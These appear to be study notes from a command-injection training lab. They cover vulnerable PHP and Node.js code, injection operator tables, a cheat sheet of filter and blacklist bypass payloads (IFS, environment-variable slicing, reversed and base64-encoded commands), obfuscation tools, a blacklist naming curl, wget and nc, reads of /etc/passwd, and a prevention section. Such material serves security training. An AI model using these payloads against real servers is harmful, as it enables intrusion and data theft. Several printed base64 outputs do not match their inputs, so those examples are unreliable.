- user input directly go into web query that execute system commands

#### PHP EXAMPLE
- functions execute system commands
	- `exec`, 
	- `system`, 
	- `shell_exec`, 
	- `passthru`, 
	- `popen`

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

####  NodeJS Example

- functions that execute system commands
	- `child_process.exec` 
	- `child_process.spawn`


```javascript
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```



## COMMAND INJECTION METHODS

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | \|                      | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |


## EXAMPLE

![[Pasted image 20240609140309.png]]

![[Pasted image 20240609140318.png]]

- NO HTTP REQUEST , VALIDATION IN FRONT END
- BYPASS USING CUSTOM HTTP REQUEST
![[Pasted image 20240609140529.png]]



## INJECTIONS
|**Injection Type**|**Operators**|
|---|---|
|SQL Injection|`'` `,` `;` `--` `/* */`|
|Command Injection|`;` `&&`|
|LDAP Injection|`*` `(` `)` `&` `\|`|
|XPath Injection|`'` `or` `and` `not` `substring` `concat` `count`|
|OS Command Injection|`;` `&` `\|`|
|Code Injection|`'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`|
|Directory Traversal/File Path Traversal|`../` `..\\` `%00`|
|Object Injection|`;` `&` `\|`|
|XQuery Injection|`'` `;` `--` `/* */`|
|Shellcode Injection|`\x` `\u` `%u` `%n`|
|Header Injection|`\n` `\r\n` `\t` `%0d` `%0a` `%09`|


## FILTER EVATION



```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

#### LINUX

- detect the possible waf/filter eg: 127.0.0.1;ls => filter blacklist charaters can be ; and ls
```bash
127.0.0.1; whoami
```

Other than the IP (which we know is not blacklisted), we sent:

1. A semi-colon character `;`
2. A space character
3. A `whoami` command

- bypass using /n or %0a 
- spaces(+) are blocked then tabs (%09) or {ls,-al}
- ${IFS}(internal field seperator) contains space tab /n by default

- if spaces are bloacked the we use $==IFS==
- what it slashes(/) are blocked  ..... we can get slashes from env variable

```bash
pradyun2005@htb[/htb]$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

-  here we see first character is / , we can sue slicing to get slash from this

```bash
pradyun2005@htb[/htb]$ echo ${PATH:0:1}

/
```

- no usage of echo in our payload (here for visiblisty used)

- same can be done using `$HOME` or `$PWD` environment variables
```
pradyun2005@htb[/htb]$ echo ${LS_COLORS}   

rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.avif=01;35:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.crdownload=00;90:*.dpkg-dist=00;90:*.dpkg-new=00;90:*.dpkg-old=00;90:*.dpkg-tmp=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:*.swp=00;90:*.tmp=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90::ow=30;44:
```

- we can get` : ; ``*` from the above

- using **character shifting** 

```shell
pradyun2005@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
pradyun2005@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```


#### WINDOWS

**IN CMD**
- to get slash `%HOMEPATH%` -> `\Users\htb-student`

```cmd
C:\htb> echo %HOMEPATH:~6,-11%
```

**IN POWERSHELL**

```powershell
PS C:\htb> $env:HOMEPATH[0]
```


**ASSESMENT**
- 127.0.0.1%0als%09${PATH:0:1}home => to find user in /home directory

#### BLACKLIST COMMANDS

```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```



```shell
w'h'o'am'i
w"h"o"am"i
who$@ami
w\ho\am\i
```

```cmd
 who^ami
```



### Advanced Command Obfuscation

- using above techniques i got source code
```PHP
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$output = '';

function filter($str)
{
  $operators = ['&', '|', ';', '\\', '/', ' '];
  foreach ($operators as $operator) {
    if (strpos($str, $operator)) {
      return true;
    }
  }

  $words = ['whoami', 'echo', 'cat', 'rm', 'mv', 'cp', 'id', 'curl', 'wget', 'cd', 'sudo', 'mkdir', 'man', 'history', 'ln', 'grep', 'pwd', 'file', 'find', 'kill', 'ps', 'uname', 'hostname', 'date', 'uptime', 'lsof', 'ifconfig', 'ipconfig', 'ip', 'tail', 'netstat', 'tar', 'apt', 'ssh', 'scp', 'less', 'more', 'awk', 'head', 'sed', 'nc', 'netcat'];
  foreach ($words as $word) {
    if (strpos($str, $word) !== false) {
      return true;
    }
  }

  return false;
}

if (isset($_POST['ip'])) {
  $ip = $_POST['ip'];
  if (filter($ip)) {
    $output = "Invalid input";
  } else {
    $cmd = "bash -c 'ping -c 1 " . $ip . "'";
    $output = shell_exec($cmd);
  }
}
?>
```



- whoami is blacklisted so..

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") # replaces all uppercase to lowecase ,since upper case wont work
```

-  if space are blacklisted above commadn wont work.. so replace space with tab (%09)


**Reversed Commands**

```bash
pradyun2005@htb[/htb]$ echo 'whoami' | rev
imaohw
```

```bash
21y4d@htb[/htb]$ $(rev<<<'imaohw')

21y4d
```



**Encoded Commands**

##### LINUX
- encode with base64
```bash
pradyun2005@htb[/htb]$ echo -n 'cat%09${PATH:0:1}flag.txt' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

```bash
pradyun2005@htb[/htb]$ bash<<<$(base64%09-d<<<Y2F0JTA5JHtQQVRIOjA6MX1mbGFnLnR4dA==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

- we are using <<< since | is blacklisted


##### WINDOWS

```powershell
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA
```

```powershell
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

21y4d
```




**ASSESMENT**

1) Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1
```bash
echo -n 'cat%0' | base64
```

```bash
bash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```


### Evasion Tools

-  [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator) -> **LINUX**
- setup
```shell
pradyun2005@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
pradyun2005@htb[/htb]$ cd Bashfuscator
pradyun2005@htb[/htb]$ pip3 install setuptools==65
pradyun2005@htb[/htb]$ python3 setup.py install --user
pradyun2005@htb[/htb]$ cd ./bashfuscator/bin/
pradyun2005@htb[/htb]$ ./bashfuscator -h
pradyun2005@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'
```

-  [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) -> **WINDOWS**
- setup
```powershell
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> help
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```

- dont have access to Windows VM -> run viz pwsh



## PREVENTION

- user input dont not include in system command
- in this case if you want to test a host alive use `fshockopen`

### Input Validation
- implemented both in frontend and backend
- in this case backend validation is missing 

```php
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // call function
} else {
    // deny request
}
```

-  in js validation done using regx on both front end and backend or use  [is-ip](https://www.npmjs.com/package/is-ip)

```javascript
if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
    // call function
}
else{
    // deny request
}
```

### Input Sanitization
- removing any non-necessary special characters from the user input
- performed after input validation
- use preg_replace to remove special characters in php or replace in js

```php
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
```

```javascript
var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
```
- or use DOMPurify
```javascript
import DOMPurify from 'dompurify';
var ip = DOMPurify.sanitize(ip);
```

- if special character must be allowed then  `escapeshellcmd` in php or `escape(ip)` in js

### Server Configuration

- Use the web server's built-in Web Application Firewall (e.g., in Apache `mod_security`), in addition to an external WAF (e.g. `Cloudflare`, `Fortinet`, `Imperva`..)
    
- Abide by the [Principle of Least Privilege (PoLP)](https://en.wikipedia.org/wiki/Principle_of_least_privilege) by running the web server as a low privileged user (e.g. `www-data`)
    
- Prevent certain functions from being executed by the web server (e.g., in PHP `disable_functions=system,...`)
    
- Limit the scope accessible by the web application to its folder (e.g. in PHP `open_basedir = '/var/www/html'`)
    
- Reject double-encoded requests and non-ASCII characters in URLs
    
- Avoid the use of sensitive/outdated libraries and modules (e.g. [PHP CGI](https://www.php.net/manual/en/install.unix.commandline.php))




### CHEETSHEET



## Injection Operators

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |

---

# Linux

## Filtered Character Bypass

|Code|Description|
|---|---|
|`printenv`|Can be used to view all environment variables|
|**Spaces**||
|`%09`|Using tabs instead of spaces|
|`${IFS}`|Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. `$()`)|
|`{ls,-la}`|Commas will be replaced with spaces|
|**Other Characters**||
|`${PATH:0:1}`|Will be replaced with `/`|
|`${LS_COLORS:10:1}`|Will be replaced with `;`|
|`$(tr '!-}' '"-~'<<<[)`|Shift character by one (`[` -> `\`)|

---

## Blacklisted Command Bypass

|Code|Description|
|---|---|
|**Character Insertion**||
|`'` or `"`|Total must be even|
|`$@` or `\`|Linux only|
|**Case Manipulation**||
|`$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`|Execute command regardless of cases|
|`$(a="WhOaMi";printf %s "${a,,}")`|Another variation of the technique|
|**Reversed Commands**||
|`echo 'whoami' \| rev`|Reverse a string|
|`$(rev<<<'imaohw')`|Execute reversed command|
|**Encoded Commands**||
|`echo -n 'cat /etc/passwd \| grep 33' \| base64`|Encode a string with base64|
|`bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`|Execute b64 encoded string|

---

# Windows

## Filtered Character Bypass

|Code|Description|
|---|---|
|`Get-ChildItem Env:`|Can be used to view all environment variables - (PowerShell)|
|**Spaces**||
|`%09`|Using tabs instead of spaces|
|`%PROGRAMFILES:~10,-5%`|Will be replaced with a space - (CMD)|
|`$env:PROGRAMFILES[10]`|Will be replaced with a space - (PowerShell)|
|**Other Characters**||
|`%HOMEPATH:~0,-17%`|Will be replaced with `\` - (CMD)|
|`$env:HOMEPATH[0]`|Will be replaced with `\` - (PowerShell)|

---

## Blacklisted Command Bypass

|Code|Description|
|---|---|
|**Character Insertion**||
|`'` or `"`|Total must be even|
|`^`|Windows only (CMD)|
|**Case Manipulation**||
|`WhoAmi`|Simply send the character with odd cases|
|**Reversed Commands**||
|`"whoami"[-1..-20] -join ''`|Reverse a string|
|`iex "$('imaohw'[-1..-20] -join '')"`|Execute reversed command|
|**Encoded Commands**||
|`[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`|Encode a string with base64|
|`iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`|Execute b64 encoded string|

